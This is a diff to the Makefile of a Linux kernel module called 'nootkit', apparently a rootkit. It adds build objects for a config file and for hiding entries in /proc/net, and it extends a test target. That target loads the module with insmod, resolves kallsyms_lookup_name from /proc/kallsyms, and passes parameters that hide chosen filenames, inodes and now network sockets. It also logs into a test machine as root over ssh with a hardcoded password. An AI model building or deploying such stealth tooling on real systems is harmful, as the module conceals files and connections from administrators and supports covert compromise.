@@ -1,6 +1,7 @@
 KDIR := ${PWD}/kernel-headers/linux-headers-5.15.0-76-generic
 obj-m := nootkit.o
-nootkit-y := src/nootkit_main.o src/ksyms.o src/hide/readdir.o
+nootkit-y := src/nootkit_main.o src/ksyms.o src/config.o
+nootkit-y += src/hide/readdir.o src/hide/proc_net.o
 nootkit-y += src/arch/x86_64/hook.o src/arch/x86_64/mm.o
 
 ccflags-y := -I$(src)/src
@@ -25,7 +26,9 @@ test-load: build test-unload
 	'insmod /nootkit.ko \
 	kallsyms_lookup_name=0x$$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
 	hide_filenames=hello,q \
-	hide_inodes=138210,17635'
+	hide_inodes=138210,17635 \
+	hide_sockets=PROTO=1\|LOCAL=1.2.3.4/16.16.16.16:53\|FOREIGN=4.5.6.7/255.255.255.255:13 \
+	'
 
 test-hello: test-load
 	sshpass -pa ssh root@${TEST_IP} "journalctl -kS -10sec"
